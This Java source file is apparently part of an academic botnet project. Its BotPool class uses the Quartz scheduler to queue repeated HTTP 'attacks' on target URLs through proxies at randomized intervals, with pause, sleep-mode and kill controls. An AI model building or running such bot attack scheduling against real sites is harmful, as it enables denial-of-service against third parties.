/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core.exec;

import com.acmutv.botnet.core.attack.HttpAttack;
import com.acmutv.botnet.core.attack.HttpAttacker;
import com.acmutv.botnet.tool.net.HttpMethod;
import com.acmutv.botnet.tool.net.HttpProxy;
import com.acmutv.botnet.tool.time.Interval;
import lombok.Getter;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.quartz.*;
import org.quartz.impl.StdSchedulerFactory;
import org.quartz.impl.calendar.CronCalendar;
import org.quartz.impl.matchers.GroupMatcher;

import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.text.ParseException;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.ThreadLocalRandom;

/**
 * The bot's thread pool, both fixed and scheduled.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see ExecutorService
 */
@Getter
public class BotPool {

  private static final Logger LOGGER = LogManager.getLogger(BotPool.class);

  /**
   * The name of the job group of all jobs performing HTTP attacks.
   */
  private static final String JOB_GROUP_ATTACKS_HTTP = "jobs.attack.http";

  /**
   * The jobs search key that matches all jobs.
   */
  private static final GroupMatcher<JobKey> JOB_GROUP_ALL = GroupMatcher.anyJobGroup();

  /**
   * The job search key that matches alla attack jobs.
   */
  private static final GroupMatcher<JobKey> JOB_GROUP_ATTACKS = GroupMatcher.jobGroupStartsWith("jobs.attack");

  /**
   * The name of the calendar that blocks all trigger
   */
  private static final String CALENDAR_SLEEP = "calendar.sleep";

  /**
   * The Quartz scheduler.
   */
  private Scheduler scheduler;

  /**
   * The Quartz scheduler default properties.
   */
  private static Properties SCHEDULER_PROPERTIES;
  static {
    SCHEDULER_PROPERTIES = new Properties();
    try (InputStream in = BotPool.class.getResourceAsStream("/quartz.properties")) {
      SCHEDULER_PROPERTIES.load(in);
    } catch (IOException ignored) { }
  }

  /**
   * Construct a new pool, allocating a new Quartz scheduler.
   * @throws SchedulerException when the Quartz scheduler cannot be created.
   */
  public BotPool() throws SchedulerException {
    LOGGER.trace("Starting scheduler...");
    final String schedName = String.format("BotPool.%s.%d",
        System.currentTimeMillis(), ThreadLocalRandom.current().nextInt());
    Properties props = new Properties(SCHEDULER_PROPERTIES);
    props.setProperty(StdSchedulerFactory.PROP_SCHED_INSTANCE_NAME, schedName);
    final SchedulerFactory factory = new StdSchedulerFactory(props);
    this.scheduler = factory.getScheduler();
    this.scheduler.start();
    LOGGER.trace("Scheduler started");
  }

  /**
   * Checks if the pool is active.
   * @return true if the pool is active; false,otherwise.
   * @throws SchedulerException when pool status cannot be checked.
   */
  public boolean isActive() throws SchedulerException {
    return !this.isSleeping() && !this.isShutdown();
  }

  /**
   * Checks if the pool is sleeping.
   * @return true if the pool is sleeping; false, otherwise.
   * @throws SchedulerException when pool status cannot be checked.
   */
  public boolean isSleeping() throws SchedulerException {
    return this.scheduler.isInStandbyMode();
  }

  /**
   * Checks if the pool is shut down.
   * @return true if the pool is shut down; false, otherwise.
   * @throws SchedulerException when pool status cannot be checked.
   */
  public boolean isShutdown() throws SchedulerException {
    return this.scheduler.isShutdown();
  }

  /**
   * Schedules the {@code attack}.
   * @param attack the attack to schedule.
   * @throws SchedulerException when the attack cannot be scheduled.
   */
  public void scheduleAttackHttp(HttpAttack attack) throws SchedulerException {
    LOGGER.trace("Scheduling {}...", attack);
    final String jname = String.format("http.%s.%s.%d.%d",
        attack.getMethod().name(), attack.getTarget(),
        System.currentTimeMillis(), ThreadLocalRandom.current().nextInt());
    final JobKey jobKey = JobKey.jobKey(jname, JOB_GROUP_ATTACKS_HTTP);
    final TriggerKey triggerKey = TriggerKey.triggerKey(jname, JOB_GROUP_ATTACKS_HTTP);

    @SuppressWarnings("MismatchedQueryAndUpdateOfCollection") JobDataMap jdata = new JobDataMap();
    jdata.put("method", attack.getMethod());
    jdata.put("target", attack.getTarget());
    jdata.put("proxy", attack.getProxy());
    jdata.put("properties", attack.getProperties());
    jdata.put("executions", attack.getExecutions());
    jdata.put("period", attack.getPeriod());

    JobDetail job = JobBuilder.newJob(HttpAttacker.class)
        .withIdentity(jobKey)
        .usingJobData(jdata)
        .build();

    TriggerBuilder tb = TriggerBuilder.newTrigger().withIdentity(triggerKey);

    if (attack.getExecutions() > 1) {
      final long intervalMillis = attack.getPeriod().getRandomDuration().toMillis();
      final int repetitions = attack.getExecutions() - 1;

      tb.withSchedule(SimpleScheduleBuilder.simpleSchedule()
              .withIntervalInMilliseconds(intervalMillis)
              .withRepeatCount(repetitions)
      );
    } else {
      tb.startNow();
    }

    Trigger trigger = tb.build();

    this.scheduler.scheduleJob(job, trigger);
  }

  /**
   * Pauses all jobs in pool.
   * @throws SchedulerException when jobs cannot be paused.
   */
  public void pause() throws SchedulerException {
    LOGGER.trace("Pausing scheduler...");
    this.scheduler.pauseAll();
    this.scheduler.standby();
    LOGGER.trace("Scheduler paused");
  }

  /**
   * Resume all jobs in pool.
   * @throws SchedulerException when jobs cannot be resumed.
   */
  public void resume() throws SchedulerException {
    LOGGER.trace("Resuming scheduler...");
    this.scheduler.start();
    this.scheduler.resumeAll();
    LOGGER.trace("Scheduler resumed");
  }

  /**
   * Deletes all attacking jobs.
   */
  public void calmdown() throws SchedulerException {
    LOGGER.trace("Deleting all attacks from scheduler...");
    for (JobKey jk : this.scheduler.getJobKeys(JOB_GROUP_ATTACKS)) {
      this.scheduler.deleteJob(jk);
    }
    LOGGER.trace("All attacks deleted from scheduler");
  }

  /**
   * Delets all jobs.
   */
  public void kill() throws SchedulerException {
    LOGGER.trace("Deleting all scheduled jobs...");
    for (JobKey jk : this.scheduler.getJobKeys(JOB_GROUP_ALL)) {
      this.scheduler.deleteJob(jk);
    }
    LOGGER.trace("All jobs deleted from scheduler");
  }

  /**
   * Shuts down the scheduler, clearing all its data.
   * @param wait if true, waits for job to complete; if false destroy the scheduler immediately.
   * @throws SchedulerException when the scheduler cannot be shut down.
   */
  public void destroy(boolean wait) throws SchedulerException {
    LOGGER.trace("Shutting down scheduler...");
    this.scheduler.shutdown(wait);
    LOGGER.trace("Scheduler shut down");
  }

  /**
   * Schedules the sleep mode with cron expression {@code cronexpr}.
   * @param cronexpr the cron expression for the sleep mode.
   * @throws ParseException when {@code cronexpr} is not a valid cron expression.
   * @throws SchedulerException when the sleep mode cannot be scheduled.
   */
  public void setSleepMode(CronExpression cronexpr) throws ParseException, SchedulerException {
    LOGGER.trace("Setting sleep mode with cron-expression {}...",
        cronexpr.getCronExpression());
    CronCalendar croncal = new CronCalendar(cronexpr.getCronExpression());
    this.scheduler.addCalendar(CALENDAR_SLEEP, croncal, true, true);
    LOGGER.trace("Sleep mode set");
  }

  /**
   * Removes the sleep mode.
   * @throws SchedulerException when the sleep mode cannot be removed.
   */
  public void removeSleepMode() throws SchedulerException {
    LOGGER.trace("Removing sleep mode...");
    for (TriggerKey tk : this.scheduler.getTriggerKeys(GroupMatcher.anyTriggerGroup())) {
      Trigger t = this.scheduler.getTrigger(tk);
      this.scheduler.rescheduleJob(tk, t.getTriggerBuilder().startNow().modifiedByCalendar(null).build());
    }
    this.scheduler.deleteCalendar(CALENDAR_SLEEP);
    LOGGER.trace("Sleep mode removed");
  }

  /**
   * Return the list of scheduled HTTP attacks.
   * @return the list of scheduled HTTP attacks.
   * @throws SchedulerException when scheduled HTTP attacks cannot be retrieved
   */
  public List<HttpAttack> getScheduledHttpAttacks() throws SchedulerException {
    List<HttpAttack> attacks = new ArrayList<>();
    Set<JobKey> jkeys = this.scheduler.getJobKeys(JOB_GROUP_ATTACKS);
    for (JobKey jkey : jkeys) {
      JobDetail jdetail = this.scheduler.getJobDetail(jkey);
      JobDataMap jmap = jdetail.getJobDataMap();
      final HttpMethod method = (HttpMethod) jmap.get("method");
      final URL target = (URL) jmap.get("target");
      HttpAttack attack = new HttpAttack(method, target);
      if (jmap.containsKey("proxy")) {
        final HttpProxy proxy = (HttpProxy) jmap.get("proxy");
        attack.setProxy(proxy);
      }
      if (jmap.containsKey("properties")) {
        @SuppressWarnings("unchecked") final Map<String,String> properties = (Map<String,String>) jmap.get("properties");
        attack.setProperties(properties);
      }
      if (jmap.containsKey("executions")) {
        final int executions = (int) jmap.get("executions");
        attack.setExecutions(executions);
      }
      if (jmap.containsKey("period")) {
        final Interval period = (Interval) jmap.get("period");
        attack.setPeriod(period);
      }
      attacks.add(attack);
    }
    return attacks;
  }
}
